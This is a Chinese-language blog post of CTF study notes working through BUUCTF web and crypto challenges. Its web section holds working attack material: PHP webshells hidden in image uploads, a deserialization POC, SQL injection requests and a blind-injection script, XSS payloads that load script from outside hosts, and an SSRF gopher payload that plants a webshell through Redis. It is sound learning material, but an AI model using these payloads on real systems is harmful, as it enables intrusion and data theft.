---
layout: default
title: CTF Learning Notes
categories:
- Security
tags:
- Security
---
//Description: CTF学习入门笔记。记录学习过程中遇到的问题。

//Create Date: 2025-07-02 10:31:39

//Author: channy

[toc]

# 参考书籍 
[CTF实战：从入门到提升]

题目在 [BUUCTF](https://buuoj.cn/challenges)

使用到的工具：
1. [BurpSuite](https://portswigger.net/burp) 抓包工具
2. [GitHacker](https://github.com/WangYihang/GitHacker) 
3. [dirsearch](https://github.com/maurosoria/dirsearch) 扫描工具
4. [PHPStorm](https://www.jetbrains.com/phpstorm/) PHP的IDE
5. [AntSword](https://github.com/AntSwordProject/antSword) [AntSword-Loader](https://github.com/AntSwordProject/AntSword-Loader)
6. [Gopherus](https://github.com/tarunkant/Gopherus) [Gopherus3](https://github.com/Esonhugh/Gopherus3) Gopher协议
7. [词频分析](http://quipqiup.com) 词频分析网站

# 1 Web
## HTTP
### [HTTP](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Http)

修改请求信息，有`Referer`来源、`User-Agent`中客户端信息如浏览器等，及`X-Forwarded-For`伪造IP只允许本地访问

获取flag后需要把`flag{xxx}`整个commit才通过。。。只commit大括号里面的flag内容给我显示错误。。。

最终请求
```sh
GET /Secret.php HTTP/1.1
Host: node5.buuoj.cn:28483
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Syclover/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer:https://Sycsecret.buuoj.cn
X-Forwarded-For:127.0.0.1
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

### [BUU BURP COURSE 1](https://buuoj.cn/challenges#BUU%20BURP%20COURSE%201)

`X-Forwarded-For:127.0.0.1`不管用了，需要`X-Real-Ip:127.0.0.1`

### [Git](https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%80%E7%AB%A0%20web%E5%85%A5%E9%97%A8]%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E)


```sh
python3 -m pip install -i https://pypi.org/simple/ GitHacker

githacker --url http://0d2b78ce-3914-4c05-8538-063c5b822c38.node5.buuoj.cn:81/.git/ --output-folder ./
```
flag在index.html下`n1book{git_looks_s0_easyfun}`

### [PHP变量覆盖](https://buuoj.cn/challenges#[BJDCTF2020]Mark%20loves%20cat)

先利用.git拿到php代码
```php
include 'flag.php';

$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){
    $$x = $y;
}

foreach($_GET as $x => $y){
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}



echo "the flag is: ".$flag;
```

变量覆盖，BurpSuite的GET请求直接加参数`?yds=flag`即可
```sh
GET /?yds=flag HTTP/1.1
Host: 7828c578-72e0-4c87-883f-61a3e2fd8f27.node5.buuoj.cn:81
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

### [PHP文件读取](https://buuoj.cn/challenges#[BJDCTF2020]ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4)
```php
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```

BurpSuite的POST请求需要加上`Content-Type: application/x-www-form-urlencoded`

text可用php://input传字符串，file可用php://filter/read=convert.Base64-encode/resource=next.php

得到一串
```sh
PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K
```
暂且记下

### [PHP注入](https://buuoj.cn/challenges#[HFCTF2021%20Quals]Unsetme)
类似于SQL注入的思想
```sh
GET /?a=a%0a);%0aphpinfo( HTTP/1.1
```

```sh
GET /?a=a%0a);%0aecho%00file_get_contents(%27/flag%27 HTTP/1.1
```

### [PHP file upload](https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]Upload)
文件上传类型限制。

修改POST请求中的内容类型后
```sh
Content-Type: image/png
```
界面显示“ThinkPHP V5.1.35 LTS { 十年磨一剑-为API开发设计的高性能框架 }”

PNG头0x89504E47
```sh
89504E47
<script language="php">eval($_POST["cmd"])</script>
```

工具`dirsearch`需要python 3.9及以上。
```sh
./dirsearch.py -u http://066ef743-ac4c-49bd-a357-ccc1a1ce4f59.node5.buuoj.cn:81/ -e "*"
```
但显示
```sh
Skipped the target due to 429 status code
```
错误，扫描请求频率过高被服务器限制。`--delay 0.1 -t 1`延时加减线程为1.

最终使用命令和结果显示
```sh
$ ./dirsearch.py -u http://16137a97-71f1-40c5-81a0-a51295133c93.node5.buuoj.cn:81 -e , --delay 0.1 -t 1 -i 200,403

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions:  | HTTP method: GET | Threads: 1 | Wordlist size: 9119

Target: http://16137a97-71f1-40c5-81a0-a51295133c93.node5.buuoj.cn:81/

[14:56:19] Scanning: 
[14:58:21] 200 -   216B - /.htaccess
[15:13:50] 200 -    1KB - /favicon.ico
[15:23:23] 200 -    24B - /robots.txt
[15:27:15] 200 -   287B - /upload/
[15:29:49] 200 -   24MB - /www.tar.gz

Task Completed
```
直接在浏览器地址栏输入`http://16137a97-71f1-40c5-81a0-a51295133c93.node5.buuoj.cn:81/www.tar.gz`即可下载文件。

文件代码中搜索`upload`可以定位到Register.php和Profile.php两个主要文件。

index.php中显示登录会反序列化cookie
```php
    public function login_check(){
        $profile=cookie('user');
        if(!empty($profile)){
            $this->profile=unserialize(base64_decode($profile));
            $this->profile_db=db('user')->where("ID",intval($this->profile['ID']))->find();
            if(array_diff($this->profile_db,$this->profile)==null){
                return 1;
            }else{
                return 0;
            }
        }
    }
```

图片马GIF头0xGIF89a
```sh
GIF89a
<?php @eval($_POST['cmd']);?>

# 或
<script language="php">eval($_POST['cmd']);</script>
```
或者上传空文件后在Content-Type: 后面修改类型后再加文件内容也可以。

upload.php即POC
```php
<?php
namespace app\web\controller;

class Profile
{
    public $checker = 0;
    public $filename_tmp = "./upload/e0cd7c28b74327b3bd1472378bdfbfa2/2fffb588e7310cb65c09fd2e21a0e834.png";
    public $filename = "./upload/e0cd7c28b74327b3bd1472378bdfbfa2/shell.php";
    public $ext = 1;
    public $except = array('index'=>'upload_img');
}

class Register
{
    public $checker;
    public $registed = 0;
}
$profile = new Profile();
$register = new Register();
$register->checker = $profile;
echo base64_encode(serialize($register));
?>
```

```sh
$ sudo apt install php7.4-cli

$ php upload.php
TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo1OntzOjc6ImNoZWNrZXIiO2k6MDtzOjEyOiJmaWxlbmFtZV90bXAiO3M6Nzg6Ii4vdXBsb2FkL2UwY2Q3YzI4Yjc0MzI3YjNiZDE0NzIzNzhiZGZiZmEyLzJmZmZiNTg4ZTczMTBjYjY1YzA5ZmQyZTIxYTBlODM0LnBuZyI7czo4OiJmaWxlbmFtZSI7czo1MToiLi91cGxvYWQvZTBjZDdjMjhiNzQzMjdiM2JkMTQ3MjM3OGJkZmJmYTIvc2hlbGwucGhwIjtzOjM6ImV4dCI7aToxO3M6NjoiZXhjZXB0IjthOjE6e3M6NToiaW5kZXgiO3M6MTA6InVwbG9hZF9pbWciO319czo4OiJyZWdpc3RlZCI7aTowO30=
```

刷新页面并把上面的payload放到cookie中多试几次，即可以看到upload/下原上传的图像被重命名了POC中的`filename` 

使用AntSword连接重命名后的文件`http://xxx.php`，密码是前面图片马中`<?php @eval($_POST['cmd']);?>`的变量名`cmd`，连接成功。

在根目录下找到/flag

## Bash/Cmd
### [命令注入](https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping)
```sh 
>>> base64.b64encode(b'flag.php').decode()
'ZmxhZy5waHA='

$ cat$IFS$9`echo$IFS$9ZmxhZy5waHA=|base64$IFS$9-d`
```
### [SQL注入](https://buuoj.cn/challenges#BUU%20SQL%20COURSE%201)
使用BurpSuite抓包Repeater空格需要转义%0a -> space

数据库
```sh
GET /backend/content_detail.php?id=-1%0aunion%0aselect%0a1,group_concat(schema_name)%0afrom%0ainformation_schema.schemata;# HTTP/1.1

{"title":"1","content":"information_schema,performance_schema,test,mysql,ctftraining,news"}
```
数据表
```sh
GET /backend/content_detail.php?id=-1%0aunion%0aselect%0a1,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema='ctftraining';# HTTP/1.1

{"title":"1","content":"FLAG_TABLE,news,users"}
```
字段
```sh
GET /backend/content_detail.php?id=-1%0aunion%0aselect%0a1,group_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_schema='ctftraining'%0aand%0atable_name='FLAG_TABLE';# HTTP/1.1

{"title":"1","content":"FLAG_COLUMN"}
```
值
```sh
GET /backend/content_detail.php?id=-1%0aunion%0aselect%0a1,FLAG_COLUMN%0afrom%0actftraining.FLAG_TABLE;# HTTP/1.1
```
但获取到的是空。。。改获取`users`表，用户名和密码登录失败。。。
```sh
GET /backend/content_detail.php?id=-1%0aunion%0aselect%0a1,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema='news';# HTTP/1.1

{"title":"1","content":"admin,contents"}

GET /backend/content_detail.php?id=-1%0aunion%0aselect%0a1,group_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_schema='news'%0aand%0atable_name='admin';# HTTP/1.1

{"title":"1","content":"id,username,password"}
```
最后拿到用户名admin密码`{"title":"1","content":"f22052f1061e5e21b134a749e84bdc1c"}`登录取得flag.

### [SQL布尔盲注](https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1]Hack%20World)

```py
import requests
import time

url = 'http://6bb7f5fc-177b-4897-80ab-a70f04d0ac47.node5.buuoj.cn:81/index.php'
result = ''
# uuid 36位 + flag{}
for i in range(1, 44): 
    # ascii 0～31：控制字符（不可见，如换行、退格等）
    for j in range(32, 128):
        time.sleep(0.1)
        payload = '(ascii(substr((select(flag)from(flag)),' + str(i) + ',1))>' + str(j) + ')'
        res = requests.post(url, data = {'id': payload})
        # print('respond:', res, res.text)
        if res.text.find('girl') == -1:
            result += chr(j)
            print(i, j, chr(j))
            break
print(result)
```

### [XSS](https://buuoj.cn/challenges#BUU%20XSS%20COURSE%201)
2025年7月访问[内网xss](http://xss.buuoj.cn)已停止服务。。。

书中命令
```sh
<img src="tmp.png" onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22http%3A%2F%2Fxss.buuoj.cn%2FZFnLJY%22%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));>
```
```Java
var b = document.createElement("sCript");  // 创建一个 script 元素
b.src = "http://xss.buuoj.cn/ZFnLJY";     // 设置外部脚本地址
// 将 script 插入到 <head> 或 <body> 中
(document.getElementsByTagName("HEAD")[0] || document.body).appendChild(b);
```

选择平台[xssjs](https://xssjs.com/login/)，创建项目，选择默认模块，选择复制代码
```sh
<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='//ujs.ci/yyo';>
```
但是平台并没有收到期望信息。。。

### [SSFR](https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E7%8E%84%E6%AD%A6%E7%BB%84]SSRFMe)

```sh
http://17cf1dbf-a570-4fc2-b02b-f88141cc740d.node5.buuoj.cn:81/?url=http://127.0.0.1

http://127.0.0.1 is inner ip
```

```sh
http://17cf1dbf-a570-4fc2-b02b-f88141cc740d.node5.buuoj.cn:81/?url=http://0.0.0.0/hint.php
```

```sh
http://17cf1dbf-a570-4fc2-b02b-f88141cc740d.node5.buuoj.cn:81/?url=dict://0.0.0.0:6379/

string(39) "-NOAUTH Authentication required. +OK "
```
原始Redis
```sh
auth root 
config set dir /var/www/html/ 
config set dbfilename shell.php
set x <?php phpinfo(); ?>
save
```
一次URL编码成Gopher
```sh
gopher://127.0.0.1:6379/_auth%20root%0D%0Aconfig%20set%20dir%20/var/www/html/%0D%0Aconfig%20set%20dbfilename%20shell.php%0D%0Aset%20x%20%22%3C%3Fphp%20phpinfo%28%29%3B%20%3F%3E%22%0D%0Asave%0D%0A
```
二次URL编码
```sh
gopher%3A%2F%2F127.0.0.1%3A6379%2F_auth%2520root%250D%250Aconfig%2520set%2520dir%2520%2Fvar%2Fwww%2Fhtml%2F%250D%250Aconfig%2520set%2520dbfilename%2520shell.php%250D%250Aset%2520x%2520%2522%253C%253Fphp%2520phpinfo%2528%2529%253B%2520%253F%253E%2522%250D%250Asave%250D%250A
```
访问shell.php发现有用。修改成一句话马。
```
auth root 
config set dir /var/www/html/ 
config set dbfilename shell.php
set x <?php @eval($_POST['cmd']);?>
save
```
```sh
gopher://127.0.0.1:6379/_auth%20root%0D%0Aconfig%20set%20dir%20/var/www/html/%0D%0Aconfig%20set%20dbfilename%20shell.php%0D%0Aset%20x%20%22%3C%3Fphp%20%40eval%28%24_POST%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0Asave%0D%0A

gopher%3A%2F%2F127.0.0.1%3A6379%2F_auth%2520root%250D%250Aconfig%2520set%2520dir%2520%2Fvar%2Fwww%2Fhtml%2F%250D%250Aconfig%2520set%2520dbfilename%2520shell.php%250D%250Aset%2520x%2520%2522%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527cmd%2527%255D%2529%253B%253F%253E%2522%250D%250Asave%250D%250A
```

AntSword连接找到/flag即可。

[redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)  
[redis-ssrf](https://github.com/xmsec/redis-ssrf)

# 2 Crypto
### [BASE](https://buuoj.cn/challenges#[AFCTF2018]BASE)

```py
import base64
import re

base16_dic = r'^[A-F0-9]*$'
base32_dic = r'^[A-Z2-7=]*$'
base64_dic = r'^[A-Za-z0-9/+=]*$'
n = 0
s = open('flag_encode.txt', 'rb').read()
while True:
    n += 1
    code = f"n = {n},"
    t = s.decode()
    if '{' in t:
        print(t)
        break
    elif re.match(base16_dic, t):
        s = base64.b16decode(s)
        codestr = code + "base16"
    elif re.match(base32_dic, t):
        s = base64.b32decode(s)
        codestr = code + "base32"
    elif re.match(base64_dic, t):
        s = base64.b64decode(s)
        codestr = code + "base64"
    else:
        print('......')
    print(codestr)               
```

### [Cipher](https://buuoj.cn/challenges#[AFCTF2018]Single)
c++11起使用std::shuffle替代std::random_shuffle

方法一：26个字母遍历排列解码看是否通顺，26!种组合方式太多了。。。

方法二：投机取巧，最后的“mljrl{Xv_I_lxiny_er_neja_rDc}”明显是"afctf{}"形式，可以得到四个解码映射：m->a,l->f,j->c,r->t.　两个字母成单词的xl->if/of. xlran->ift??/oft??->often......

方法三：通过词频分析网站。。。

### [Vigenere](https://buuoj.cn/challenges#[AFCTF2018]Vigen%C3%A8re)

[vigenere-solver](https://www.guballa.de/vigenere-solver)

### [EBCDIC](https://buuoj.cn/challenges#[SWPU2019]%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2)

EBCDIC编码
```sh
iconv -f IBM-1047 -t UTF-8 '├▄┬ы.txt' -o output.txt

J¾ô5¬ÜCüBÔwllm_is_the_best_team!
óQóQóQóKòÜ¯GAôJ¾ô5¬ÜCüBÔ§D£\BÔAô©3¯K¬ÕóK]SK¨¾Ú~t
```
ubuntu 20.04下使用iconv解码依旧是乱码。。。
```sh
unzip -P "wllm_is_the_best_team!" attachment.zip
```
ubuntu 20.04下前面三张图打不开。。。

### [RSA](https://buuoj.cn/challenges#[%E7%AC%AC%E5%85%AD%E7%AB%A0][6.1.6%20%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90][SWPU2020]happy)

> 对于整数分解，可以使用factordb、yafu、Sagemath等工具进行。

$$ p^3 + 1 = (p + 1) * (p^2 - p + 1) $$

```py
'''
('c=', '0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9eL')
('e=', '0x872a335')
#q + q*p^3 =1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586
#qp + q *p^2 = 1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594
'''

def extended_gcd(a, b):
    if b == 0:
        return (a, 1, 0)
    else:
        gcd, x, y = extended_gcd(b, a % b)
        return (gcd, y, x - (a // b) * y)

def modinv(a, m):
    """计算模逆元"""
    gcd, x, y = extended_gcd(a, m)
    if gcd != 1:
        return None  # 逆元不存在
    else:
        return x % m

def solvePQ():
    a = 1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586
    b = 1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594
    (res, _, _) = extended_gcd(a, b)

    p = b // res
    q = res // (p + 1)
    return p, q

def calc_keys(p, q):
    n = p * q
    phi = (p - 1) * (q - 1)
    e = 0x872a335
    d = modinv(e, phi)
    return ((e, n), (d, n))

def decrypt(ciphertext, private_key):
    d, n = private_key
    print(ciphertext)
    message = pow(ciphertext, d, n)
    return message.to_bytes((message.bit_length() + 7) // 8, 'big').decode()

if __name__ == '__main__':
    p, q = solvePQ()
    public_key, private_key = calc_keys(p, q)
    message = 0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9e
    res = decrypt(message, private_key)
    print(res)
```

### [Random](https://buuoj.cn/challenges#[GKCTF%202021]Random)
下载下来的rar文件，ubuntu 20.04下直接右键‘Extract Here’会解压出几十G的文件并且还在解压，但使用命令行`unrar x rar`又正常，原因未知。。。

```py
def initialize(seed):
    MT = [0] * 624
    MT[0] = seed
    for i in range(1, 624):
        MT[i] = (1812433253 * (MT[i-1] ^ (MT[i-1] >> 30)) + i) & 0xFFFFFFFF
    return MT

def twist(MT):
    for i in range(624):
        y = (MT[i] & 0x80000000) + (MT[(i+1)%624] & 0x7FFFFFFF)
        MT[i] = MT[(i + 397) % 624] ^ (y >> 1)
        if y % 2 != 0:
            MT[i] ^= 0x9908B0DF

def extract_number(MT, index):
    if index == 0:
        twist(MT)  # 每 624 次调用后重新扭转
    y = MT[index]
    y ^= (y >> 11)
    y ^= ((y << 7) & 0x9D2C5680)
    y ^= ((y << 15) & 0xEFC60000)
    y ^= (y >> 18)
    return y

from hashlib import md5

# y ^= (y >> bit)
def restoreRight(y, rightmoven):
    curbit = rightmoven
    resulty = y
    while curbit < 32:
        moven = min(32 - curbit, rightmoven)
        mid = resulty >> rightmoven
        resulty = y ^ mid
        curbit += moven
    return resulty

def restoreLeft(y, leftmoven, A):
    curbit = leftmoven
    resulty = y
    while curbit < 32:
        moven = min(32 - curbit, leftmoven)
        mid = resulty << leftmoven
        resulty = y ^ (mid & A)
        curbit += moven
    return resulty

# 32bit     
def restore_number(y):
    # y ^= (y >> 18)
    y = restoreRight(y, 18)
    # y ^= ((y << 15) & 0xEFC60000)
    y = restoreLeft(y, 15, 0xEFC60000)
    # y ^= ((y << 7) & 0x9D2C5680)
    y = restoreLeft(y, 7, 0x9D2C5680)
    # y ^= (y >> 11)
    y = restoreRight(y, 11)
    return y

def assert_number(y):
    y ^= (y >> 11)
    y ^= ((y << 7) & 0x9D2C5680)
    y ^= ((y << 15) & 0xEFC60000)
    y ^= (y >> 18)
    return y

def recalc():
    MT = []
    file = open("random.txt", "r")
    for _ in range(104):
        str32 = file.readline()
        num = (int)(str32)
        res = restore_number(num)
        MT.append(res)

        str64 = file.readline()
        num = (int)(str64)
        res = restore_number(num & ((1 << 32) - 1))
        MT.append(res)
        res = restore_number((num >> 32))
        MT.append(res)

        str96 = file.readline()
        num = (int)(str96)
        res = restore_number(num & ((1 << 32) - 1))
        MT.append(res)
        num >>= 32
        res = restore_number(num & ((1 << 32) - 1))
        MT.append(res)
        res = restore_number((num >> 32))
        MT.append(res)
    res = extract_number(MT, 0)
    flag = md5(str(res).encode()).hexdigest()
    print(flag)

if __name__ == '__main__':
    recalc()
```

### [MD5](http://buuoj.cn/challenges#[De1CTF%202019]SSRF%20Me)
md5(key + param + scan)

则action=scan下param=flag.txtread获取到的sign就是action=readscan下param=flag.txt的sign
```py
def method1():
    import requests
    # param=flag.txtread -> sign
    url = 'http://13f3662d-d04c-481d-aae0-44fcebb4e36a.node5.buuoj.cn:81/De1ta?param=flag.txt'
    cookie = {
        'sign': '2773787e4b7f1e4ea8cbd60bdaff5f3f',
        'action': 'readscan'
    }
    responds = requests.get(url=url, cookies=cookie)
    print(responds.text)

def method2():
    import hashpumpy
    origin_hash = '129c0841cb12ef2e91a78a0676471f03'
    key_len = 16
    message = 'flag.txtscan'
    append = 'read'
    new_hash, new_message = hashpumpy.hashpump(origin_hash, message, append, key_len)
    print(new_hash)
    print(new_message)
    from urllib.parse import quote
    print(quote(new_message)[8:])

    import requests
    url = 'http://13f3662d-d04c-481d-aae0-44fcebb4e36a.node5.buuoj.cn:81/De1ta?param=flag.txt'
    cookie = {
        'sign': new_hash,
        'action': quote(new_message)[8:]
    }
    responds = requests.get(url=url, cookies=cookie)
    print(responds.text)
```

# 3 MISC
### []()
